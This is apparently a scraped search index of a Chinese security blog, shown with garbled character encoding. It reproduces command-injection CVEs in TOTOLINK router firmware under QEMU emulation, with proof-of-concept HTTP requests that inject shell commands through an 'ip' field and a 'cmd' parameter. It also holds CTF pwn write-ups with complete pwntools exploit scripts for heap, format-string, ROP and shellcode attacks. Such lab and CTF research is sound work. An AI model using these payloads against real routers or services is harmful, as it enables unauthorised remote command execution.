&lt;pre&gt;&lt;code&gt;ELF å¤´ï¼š
  Magicï¼š  7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 
  ç±»åˆ«:                              ELF32
  æ•°æ®:                              2 è¡¥ç ï¼Œå°ç«¯åº (little endian)
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI ç‰ˆæœ¬:                          0
  ç±»å‹:                              EXEC (å¯æ‰§è¡Œæ–‡ä»¶)
  ç³»ç»Ÿæ¶æ„:                          MIPS R3000
  ç‰ˆæœ¬:                              0x1
  å…¥å£ç‚¹åœ°å€ï¼š              0x402c80
  ç¨‹åºå¤´èµ·ç‚¹ï¼š              52 (bytes into file)
  Start of section headers:          607496 (bytes into file)
  æ ‡å¿—ï¼š             0x70001007, noreorder, pic, cpic, o32, mips32r2
  Size of this header:               52 (bytes)
  Size of program headers:           32 (bytes)
  Number of program headers:         8
  Size of section headers:           40 (bytes)
  Number of section headers:         25
  Section header string table index: 24
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;32ä½mipså°ç«¯åºï¼Œè¿™é‡Œä½¿ç”¨qemu-systemæ¨¡å¼åˆ›å»ºè™šæ‹Ÿæœºæ¨¡æ‹Ÿå›ºä»¶ï¼Œæ³¨æ„æŒ‡å®šè¾ƒæ–°çš„cpuï¼Œä»¥å…å‡ºç°&lt;code&gt;illegal instruction&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo qemu-system-mipsel \
-M malta \
-cpu 74Kf \
-m 2G \
-object rng-random,id=rng0,filename=/dev/urandom -device virtio-rng-pci,rng=rng0 \
-kernel vmlinux-3.2.0-4-4kc-malta \
-hda debian_wheezy_mipsel_standard.qcow2 \
-append &amp;quot;root=/dev/sda1 console=tty0&amp;quot; \
-netdev tap,id=tapnet,ifname=tap2,script=no \
-device rtl8139,netdev=tapnet \
-nographic
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åˆ›å»ºæˆåŠŸåroot/rootç™»å½•ï¼Œè™šæ‹Ÿæœºæ‰§è¡Œï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ifconfig eth0 192.168.122.15 up # é…ç½®è·¯ç”±å™¨IP
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ–¹ä¾¿èµ·è§ï¼Œæˆ‘ä»¬æ‰¾åˆ°é…ç½®æ–‡ä»¶&lt;code&gt;/lighttpd/lighttpd.conf&lt;/code&gt;å¹¶å°†æŒ‡å®špidæ–‡ä»¶é‚£ä¸€è¡Œæ³¨é‡Šæ‰ï¼Œåç»­ä¸ç”¨å•ç‹¬åˆ›å»º&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1691499443007.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ç„¶åhostæ‰§è¡Œï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;scp -r squashfs-root/ root@192.168.122.15:/root/ # æ‹·è´è·¯ç”±å™¨æ–‡ä»¶åˆ°è™šæ‹Ÿæœº
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿è¡Œä»¥ä¸‹å‘½ä»¤æŒ‚è½½è·¯ç”±å™¨å¹¶å¯åŠ¨æœåŠ¡&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;chroot ./squashfs-root/ /bin/sh 

/usr/sbin/lighttpd -f /lighttp/lighttpd.conf -m /lighttp/lib    #-mæŒ‡å®šåŠ¨æ€é“¾æ¥åº“æ‰€åœ¨æ–‡ä»¶å¤¹
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1691499467495.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
æˆåŠŸå¯åŠ¨æœåŠ¡åéªŒè¯&lt;br&gt;
POC:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;POST /cgi-bin/cstecgi.cgi HTTP/1.1
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Length: 26
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Host: 192.168.122.15
Origin: http://192.168.122.15
Proxy-Connection: keep-alive
Referer: http://192.168.122.15/login.html
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
X-Requested-With: XMLHttpRequest

{&amp;quot;ip&amp;quot;:&amp;quot;;ls;&amp;quot;,&amp;quot;topicurl&amp;quot;:&amp;quot;setDiagnosisCfg&amp;quot;}
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1691499526940.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
">CVE-2022-37083 å¤ç°</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/dvNDl3Egy/"" data-c="
          &lt;h3 id=&#34;æ¦‚è¿°&#34;&gt;&lt;strong&gt;æ¦‚è¿°&lt;/strong&gt;ï¼š&lt;/h3&gt;
&lt;p&gt;TOTOLINK T6_Firmware V5.9c.4085_B20190428å­˜åœ¨ä¸€ä¸ªä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œä½äº&lt;code&gt;cgi-bin/downloadFlile.cgi&lt;/code&gt;ä¸­&lt;br&gt;
&lt;a href=&#34;https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/190/ids/36.html&#34;&gt;ä¸‹è½½é“¾æ¥&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;æ¼æ´&#34;&gt;&lt;strong&gt;æ¼æ´&lt;/strong&gt;ï¼š&lt;/h3&gt;
&lt;p&gt;æ¼æ´ç‚¹å‡ºç°åœ¨&lt;code&gt;cgi-bin/downloadFlile.cgi&lt;/code&gt;ç¨‹åºä¸­mainå‡½æ•°ä¸­&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1691426998868.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ç¨‹åºé€šè¿‡è·å–è¯·æ±‚å‚æ•°å°†å‚æ•°ä¼ é€’ç»™å˜é‡&lt;code&gt;v14&lt;/code&gt;ï¼Œä¹‹åå†é€šè¿‡&lt;code&gt;sprintf&lt;/code&gt;å°†å‚æ•°æ ¼å¼åŒ–æ‹¼æ¥åœ¨å˜é‡&lt;code&gt;v24&lt;/code&gt;å&lt;br&gt;
æœªè¢«è¿‡æ»¤çš„&lt;code&gt;v24&lt;/code&gt;ä¼ å…¥&lt;code&gt;system&lt;/code&gt;å‡½æ•°ï¼Œè¿›è€Œå¯¼è‡´ä»»æ„å‘½ä»¤æ‰§è¡Œ&lt;/p&gt;
&lt;h3 id=&#34;å¤ç°&#34;&gt;&lt;strong&gt;å¤ç°&lt;/strong&gt;ï¼š&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;binwalk -Me&lt;/code&gt;æå–å›ºä»¶åè¿›å…¥&lt;code&gt;squashfs-root&lt;/code&gt;ç›®å½•ä¸‹æ‰§è¡Œ&lt;code&gt;readelf -h ./bin/busybox&lt;/code&gt;æŸ¥çœ‹æ¶æ„ç­‰ç›¸å…³ä¿¡æ¯&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ELF å¤´ï¼š
  Magicï¼š  7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 
  ç±»åˆ«:                              ELF32
  æ•°æ®:                              2 è¡¥ç ï¼Œå°ç«¯åº (little endian)
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI ç‰ˆæœ¬:                          0
  ç±»å‹:                              EXEC (å¯æ‰§è¡Œæ–‡ä»¶)
  ç³»ç»Ÿæ¶æ„:                          MIPS R3000
  ç‰ˆæœ¬:                              0x1
  å…¥å£ç‚¹åœ°å€ï¼š              0x403bc0
  ç¨‹åºå¤´èµ·ç‚¹ï¼š              52 (bytes into file)
  Start of section headers:          0 (bytes into file)
  æ ‡å¿—ï¼š             0x70001005, noreorder, cpic, o32, mips32r2
  Size of this header:               52 (bytes)
  Size of program headers:           32 (bytes)
  Number of program headers:         8
  Size of section headers:           0 (bytes)
  Number of section headers:         0
  Section header string table index: 0
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ç¡®å®šä¸ºmipselåé‡‡ç”¨qemuçš„systemæ¨¡å¼æ¨¡æ‹Ÿ&lt;br&gt;
é¦–å…ˆé…ç½®ç½‘ç»œï¼Œå°†ä»¥ä¸‹å†…å®¹å†™å…¥æ–‡ä»¶åsourceå³å¯&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo brctl addbr virbr2 # åˆ›å»ºç½‘æ¡¥
sudo ifconfig virbr2 192.168.122.1/24 up # é…ç½®ç½‘æ¡¥IP
sudo tunctl -t tap2 # æ·»åŠ è™šæ‹Ÿç½‘å¡tap2
sudo ifconfig tap2 192.168.122.11/24 up # é…ç½®è™šæ‹Ÿç½‘å¡IP
sudo brctl addif virbr2 tap2 # é…ç½®è™šæ‹Ÿç½‘å¡ä¸ç½‘æ¡¥è¿æ¥
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æå‰ä¸‹è½½å¥½é•œåƒå’Œè™šæ‹Ÿç£ç›˜&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;wget https://people.debian.org/~aurel32/qemu/mipsel/debian_wheezy_mipsel_standard.qcow2 &amp;amp;&amp;amp; wget https://people.debian.org/~aurel32/qemu/mipsel/vmlinux-3.2.0-4-4kc-malta
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ç„¶åå¯åŠ¨è™šæ‹Ÿæœº&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo qemu-system-mipsel \
-M malta \
-cpu 24KEc \
-m 1G \
-object rng-random,id=rng0,filename=/dev/urandom -device virtio-rng-pci,rng=rng0 \
-kernel vmlinux-3.2.0-4-4kc-malta \
-hda debian_wheezy_mipsel_standard.qcow2 \
-append &amp;quot;root=/dev/sda1 console=tty0&amp;quot; \
-netdev tap,id=tapnet,ifname=tap2,script=no \
-device rtl8139,netdev=tapnet \
-nographic
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è™šæ‹Ÿæœºå¯åŠ¨æˆåŠŸåroot/rootè¿›å…¥ï¼Œæ­¤æ—¶é…ç½®è™šæ‹Ÿæœºç½‘ç»œ&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ifconfig eth0 192.168.122.15 up
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ–¹ä¾¿èµ·è§ï¼Œå…ˆå°†&lt;code&gt;lighttp/lighttpd.conf&lt;/code&gt;ä¸­çš„pidä¸€è¡Œæ³¨é‡Šæ‰ï¼Œåç»­å°±ä¸ç”¨å•ç‹¬åˆ›å»º&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1691427943479.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
æ­¤æ—¶é€šè¿‡&lt;code&gt;scp -r squashfs-root/ root@192.168.122.15:/root/&lt;/code&gt;å°†æ–‡ä»¶ç³»ç»Ÿä¼ è¾“åˆ°è™šæ‹Ÿæœºä¸Š&lt;br&gt;
å¦‚æœæŠ¥é”™&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;scp: realpath /root/squashfs-root: No such file
scp: upload &amp;quot;/root/squashfs-root&amp;quot;: path canonicalization failed
scp: failed to upload directory squashfs-root to /root
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è®°å¾—åŠ &lt;code&gt;-O&lt;/code&gt;å°±è¡Œäº†&lt;br&gt;
ä¼ è¾“å®ŒæˆåæŒ‚è½½è·¯ç”±å™¨ç³»ç»Ÿå¹¶å¯åŠ¨webæœåŠ¡&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;chroot ./squashfs-root/ /bin/sh 
/bin/lighttpd -f /lighttp/lighttpd.conf
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ­¤æ—¶é‡åˆ°æŠ¥é”™&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1691428131035.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
åˆ™éœ€è¦æŒ‡å®šåŠ¨æ€é“¾æ¥åº“ï¼ŒåŠ ä¸Šåå˜æˆ&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;./bin/lighttpd -f ./lighttp/lighttpd.conf -m ./lighttp/lib
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¯ä»¥æˆåŠŸå¯åŠ¨æœåŠ¡&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1691428266952.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
POCï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;GET /cgi-bin/downloadFlile.cgi?cmd=`ls&amp;gt;../cmd4.txt` HTTP/1.1
Host: 192.168.122.15
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
If-None-Match: &amp;quot;-1779788291&amp;quot;
If-Modified-Since: Mon, 07 Aug 2023 14:09:36 GMT
Connection: close
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1691428986394.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1691429278253.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
">CVE-2022-25084 å¤ç°</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/SmeektZkD/"" data-c="
          &lt;p&gt;glibc 2.27 3 1.4&lt;br&gt;
æ²¡æœ‰uaf&lt;br&gt;
addä¸­å­˜åœ¨é€»è¾‘æ¼æ´ï¼Œåˆ†é…å¤§å°å¤§äº0x400å †å—ä¸æˆåŠŸï¼Œå¯ä»¥ä¿®æ”¹editæ—¶çš„nbyteså¹¶è¿”å›èœå•&lt;br&gt;
åç»­å¯ä»¥è¶Šç•Œå†™&lt;br&gt;
addï¼š&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1691215851632.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
editï¼š&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1691215971440.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;expï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./baige&amp;quot;)
# io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28702)
elf=ELF(&amp;quot;./baige&amp;quot;)
libc=ELF(&amp;quot;./libc-2.27.so&amp;quot;)

def add(n,s,cc):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt;\n&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;idx?\n&amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;size?\n&amp;quot;,str(s))
    io.sendafter(b&amp;quot;content?\n&amp;quot;,cc)

def delete(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt;\n&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;idx?\n&amp;quot;,str(n))
    
def edit(n,s,cc):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt;\n&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;idx?\n&amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;size?\n&amp;quot;,str(s))
    io.sendafter(b&amp;quot;content?\n&amp;quot;,cc)

def show(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt;\n&amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;idx?\n&amp;quot;,str(n))
    
# gdb.attach(io)
# pause()

for i in range(8):
    add(i,0x100,b&amp;quot;a&amp;quot;)

add(8,0x100,b&amp;quot;b&amp;quot;) #8

for i in range(8):
    delete(i)

for i in range(7):
    add(i,0x100,&amp;quot;d&amp;quot;)

add(0,0x10,b&amp;quot;a&amp;quot;)
show(0)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x131-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
add(0,0xe0,b&amp;quot;a&amp;quot;)

free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
shell=leak_addr+0x4f432

add(1,0x100,b&amp;quot;d&amp;quot;)
add(2,0x100,b&amp;quot;d&amp;quot;)
add(3,0x100,b&amp;quot;d&amp;quot;)
delete(3)
delete(2)

io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt;\n&amp;quot;,b&amp;quot;1&amp;quot;)
io.sendlineafter(b&amp;quot;idx?\n&amp;quot;,str(1))
io.sendlineafter(b&amp;quot;size?\n&amp;quot;,str(0x421))

edit(1,0x118,cyclic(0x108)+p64(0x101)+p64(free_hook))

add(4,0x100,b&amp;quot;q&amp;quot;)
add(5,0x100,b&amp;quot;q&amp;quot;)
edit(5,0x20,p64(shell))

delete(1)
    
io.interactive()

# 0x4f3d5 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   rsp &amp;amp; 0xf == 0
#   rcx == NULL

# 0x4f432 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a41c execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
">[é•¿å®‰æ¯ 2021å­¦ç”Ÿç»„]baige wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/mjK5Vthuj/"" data-c="
          &lt;p&gt;æ ¼å¼åŒ–å­—ç¬¦ä¸²ä»»æ„åœ°å€è¦†ç›–&lt;br&gt;
glibc 2.31-9.7&lt;br&gt;
mainå‡½æ•°è¿”å›åœ°å€å’Œ&lt;code&gt;call sub_13F7&lt;/code&gt;åªå·®1å­—èŠ‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1690885652464.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ç¬¬ä¸€æ¬¡åŠ«æŒretåˆ°æ­¤å¤„å¹¶ä¸”æ³„éœ²libc&lt;br&gt;
ç¬¬äºŒæ¬¡è¦†ç›–retåœ°å€å€¼ä¸ºone_gadgetå³å¯&lt;br&gt;
æ³¨æ„éšæœºæ•°æ¯ä¸€æ¬¡éƒ½è¦é‡æ–°ç”Ÿæˆï¼Œä¸è¦å†™åœ¨ifé‡Œé¢ï¼Œä¸ç„¶å‡ºé”™&lt;br&gt;
expï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
from ctypes import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./service&amp;quot;)
io=remote(&amp;quot;node3.anna.nssctf.cn&amp;quot;,28642)
elf=ELF(&amp;quot;./service&amp;quot;)
cs=cdll.LoadLibrary(&amp;quot;./libc-2.31.so&amp;quot;)
libc=ELF(&amp;quot;./libc-2.31.so&amp;quot;)

# gdb.attach(io)
# pause()

io.sendafter(b&amp;quot;name:\n&amp;quot;,b&amp;quot;a&amp;quot;*0x109)
io.recvuntil(b&amp;quot;a&amp;quot;*0x109)
canary=u64(io.recv(7).rjust(8,b&amp;quot;\x00&amp;quot;))
stack_addr=u64(io.recv(6).ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;canary: &amp;quot;+hex(canary))
print(&amp;quot;stack_addr: &amp;quot;+hex(stack_addr))

cs.srand(0x61616161)

def game():
    io.recvuntil(b&amp;quot;: \n&amp;quot;)
    num=cs.rand()%3
    if num==1:
        io.sendline(b&amp;quot;2&amp;quot;)
    if num==2:
        io.sendline(b&amp;quot;0&amp;quot;)
    if num==0:
        io.sendline(b&amp;quot;1&amp;quot;)

for i in range(100):
    game()

ret_addr=stack_addr-0x218

payload=&amp;quot;%{}c%{}$hhn.%9$p.&amp;quot;.format(0x3e,8).encode()+p64(ret_addr)
#å‘åç§»ä¸º8å¤„å­˜å‚¨ret_addrå¹¶è¦†ç›–ret_addråœ°å€å¤„æ•°æ®ä½å­—èŠ‚`\x43`ä¸º`\x3e`ä»è€Œè¿”å›vuln
#åŒæ—¶æ³„éœ²libcåœ°å€

io.sendafter(b&amp;quot;you.\n&amp;quot;,payload)

io.recvuntil(b&amp;quot;.&amp;quot;)
leak_addr=int(io.recv(14),16)-175-libc.sym[b&amp;quot;printf&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))
shell=leak_addr+0xe3b31

payload=fmtstr_payload(6,{ret_addr:shell})
io.send(payload)
#ä¿®æ”¹ret_addrä¸ºone_gadget

io.interactive()

# 0xe3b2e execve(&amp;quot;/bin/sh&amp;quot;, r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [r12] == NULL || r12 == NULL

# 0xe3b31 execve(&amp;quot;/bin/sh&amp;quot;, r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xe3b34 execve(&amp;quot;/bin/sh&amp;quot;, rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL
&lt;/code&gt;&lt;/pre&gt;
">[è™ç¬¦CTF 2022]babygame wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/nQxaOOZy1/"" data-c="
          &lt;h3 id=&#34;love&#34;&gt;love:&lt;/h3&gt;
&lt;p&gt;æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²canaryå’Œlibc&lt;br&gt;
å®˜æ–¹ç»™çš„æ˜¯è¦†ç›–TLSä¸Šçš„canaryï¼Œå› ä¸ºä½¿ç”¨äº†gets&lt;br&gt;
expï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28310)
# io=process(&amp;quot;./pwn&amp;quot;)
libc=ELF(&amp;quot;./libc.so.6&amp;quot;)

# gdb.attach(io)
# pause()

pop_rdi=0x4013f3
ret=0x40101a

io.recvuntil(b&amp;quot;Toka\n\n&amp;quot;)
# payload=&amp;quot;%15$p.%17$p.%486c%9$n&amp;quot;  #520-18-14-2   
payload=&amp;quot;%520c%9$n.%15$p.%17$p&amp;quot;
io.send(payload)

# gdb.attach(io)
# pause()

io.recvuntil(b&amp;quot;.&amp;quot;)
canary=int(io.recv(18),16)
io.recvuntil(b&amp;quot;.&amp;quot;)
leak_addr=int(io.recv(14),16)-libc.sym[b&amp;quot;__libc_start_main&amp;quot;]-243
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
sh_addr=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))

print(&amp;quot;canary: &amp;quot;,hex(canary))
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))

payload=cyclic(0x28)+p64(canary)+p64(0)+p64(ret)+p64(pop_rdi)+p64(sh_addr)+p64(sys_addr)
io.sendlineafter(b&amp;quot;vel\n\n&amp;quot;,payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;rbp&#34;&gt;rbp:&lt;/h3&gt;
&lt;p&gt;æ ˆè¿ç§»+orwï¼š&lt;br&gt;
expï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./rbp&amp;quot;)
io=remote(&amp;quot;node2.anna.nssctf.cn&amp;quot;,28341)
elf=ELF(&amp;quot;./rbp&amp;quot;)
libc=ELF(&amp;quot;./libc-2.31.so&amp;quot;)

pop_rdi=0x401353
leave_ret=0x40121d
read_text=0x401292
puts_got=elf.got[b&amp;quot;puts&amp;quot;]
puts_plt=elf.plt[b&amp;quot;puts&amp;quot;]

payload=cyclic(0x210)+p64(0x404910)+p64(read_text)
io.sendafter(b&amp;quot;try it\n&amp;quot;,payload)


payload=p64(0)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(0x401270)
payload=payload.ljust(0x210,b&amp;quot;a&amp;quot;)+p64(0x404910-0x210)+p64(leave_ret)
io.send(payload)

leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;puts&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))

open_a=leak_addr+libc.sym[b&amp;quot;open&amp;quot;]
read_a=leak_addr+libc.sym[b&amp;quot;read&amp;quot;]
write_a=leak_addr+libc.sym[b&amp;quot;write&amp;quot;]
pop_rsi=leak_addr+0x2601f
pop_rdx=leak_addr+0x142c92

# gdb.attach(io)
# pause()

payload=cyclic(0x210)+p64(0x404498)+p64(read_text)
io.sendafter(b&amp;quot;try it\n&amp;quot;,payload)

#open
orw=b&amp;quot;/flag\x00\x00\x00&amp;quot;+p64(pop_rdi)+p64(0x404288)+p64(pop_rsi)+p64(0)+p64(open_a)
#read
orw+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(0x404a00)+p64(pop_rdx)+p64(0x50)+p64(read_a)
#write
orw+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(0x404a00)+p64(pop_rdx)+p64(0x50)+p64(write_a)

orw=orw.ljust(0x210,b&amp;quot;a&amp;quot;)+p64(0x404490-0x208)+p64(leave_ret)
io.send(orw)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;xor&#34;&gt;xorï¼š&lt;/h3&gt;
&lt;p&gt;å­˜åœ¨xoræ¯æ¬¡åªèƒ½å¼‚æˆ–ä¸€ä¸ªå­—èŠ‚ï¼Œä½†æ˜¯æœ€å¼€å§‹æœ‰flagåˆ¤æ–­&lt;br&gt;
flagåˆå€¼ä¸º0ï¼Œå‡½æ•°è¿›å…¥æ¡ä»¶å°äºç­‰äº0&lt;br&gt;
éœ€è¦é€šè¿‡ç¬¬ä¸€æ¬¡å¼‚æˆ–å°†flagçš„ç¬¦å·ä½è¦†ç›–ä¸º0xffå³å¯ç»•è¿‡&lt;br&gt;
åé¢å‘rwxæ®µå†™shellcodeï¼Œæœ€ååŠ«æŒ&lt;code&gt;fini_array&lt;/code&gt;æŒ‡é’ˆåˆ°shellcodeå¤„å³å¯&lt;br&gt;
expï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./pwn&amp;quot;)
io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28981)
libc=ELF(&amp;quot;./libc.so.6&amp;quot;)

def xorenc(addr,val):
    io.sendlineafter(b&amp;quot;addr: &amp;quot;,addr)
    io.sendlineafter(b&amp;quot;value: &amp;quot;,val)    

# gdb.attach(io)
# pause()

pop_rdi=0x2a3e5 
flag=0x600bcc
fini_array=0x600970
sc_addr=0x600d00  # xor 0x400610  20 0B10

xorenc(hex(flag+3).encode(),b&amp;quot;0xff&amp;quot;)
xorenc(hex(fini_array).encode(),b&amp;quot;0x10&amp;quot;)
xorenc(hex(fini_array+1).encode(),b&amp;quot;0x0b&amp;quot;)
xorenc(hex(fini_array+2).encode(),b&amp;quot;0x20&amp;quot;)

shellcode=asm(shellcraft.sh())
for i in range(len(shellcode)):
    xorenc(hex(sc_addr+i),hex(shellcode[i]).encode())

xorenc(hex(flag+3).encode(),b&amp;quot;0xff&amp;quot;) #trigger

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;read_file&#34;&gt;read_file:&lt;/h3&gt;
